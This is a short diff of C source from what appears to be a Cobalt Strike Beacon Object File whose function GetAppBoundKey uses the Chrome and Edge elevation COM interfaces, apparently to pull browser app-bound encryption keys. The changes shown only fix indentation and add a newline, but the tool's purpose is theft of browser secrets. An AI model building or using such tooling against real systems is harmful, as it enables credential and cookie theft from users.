@@ -268,9 +268,9 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     if (FAILED(hr)) {
     	hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
     	if (FAILED(hr)) {
-		BeaconPrintf(CALLBACK_ERROR,"CoInitializeEx failed: 0x%x\n", hr);
+			BeaconPrintf(CALLBACK_ERROR,"CoInitializeEx failed: 0x%x\n", hr);
         	return;
-	}
+		}
     }
     IElevatorChrome* chromeElevator = NULL;
     IElevatorEdge* edgeElevator = NULL;
@@ -1446,3 +1446,4 @@ VOID go(char *buf, int len) {
         return;
     }
 }
+
